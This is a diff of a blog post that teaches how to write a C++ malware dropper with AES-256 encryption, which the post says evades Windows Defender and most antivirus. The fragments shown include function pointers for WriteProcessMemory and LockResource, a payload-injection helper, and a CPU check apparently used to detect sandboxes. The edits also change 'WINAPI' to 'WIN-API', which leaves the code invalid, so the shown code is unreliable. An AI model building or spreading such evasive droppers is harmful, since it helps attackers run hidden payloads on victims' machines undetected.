@@ -3,7 +3,7 @@ title: "Custom C++ Dropper AES-256 ENC"
 layout: "post"
 ---
 
-In this blog post we will code our first curstom dropper written in pure __C++ code_. At the time of writing the custom dropper will not get flagged by Windows Defender and it should pass under the radar of most AV's. 
+In this blog post we will code our first curstom dropper written in pure __C++_ code. At the time of writing the custom dropper will not get flagged by Windows Defender and it should pass under the radar of most AV's. 
 There are other aspects to take into account when attempting to bypass signature based AV, we will try to discuss this briefly towards the end of the blog posts.
 
 
@@ -226,7 +226,7 @@ Below we can find the full c++ code written for this exercise.
 #pragma comment (lib, "advapi32")
 #include <psapi.h>
 
-BOOL (WINAPI * pWriteProcessMemory)(
+BOOL (WIN-API * pWriteProcessMemory)(
   HANDLE  hProcess,
   LPVOID  lpBaseAddress,
   LPCVOID lpBuffer,
@@ -234,7 +234,7 @@ BOOL (WINAPI * pWriteProcessMemory)(
   SIZE_T  *lpNumberOfBytesWritten
 );
 
-LPVOID (WINAPI * pLockResource)(
+LPVOID (WIN-API * pLockResource)(
   HGLOBAL hResData
 );
 
@@ -318,7 +318,7 @@ int m4(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
 }
 //Declare actual main win Function
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+int WIN-API WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 
 	// check CPU
 	SYSTEM_INFO systemInfo;
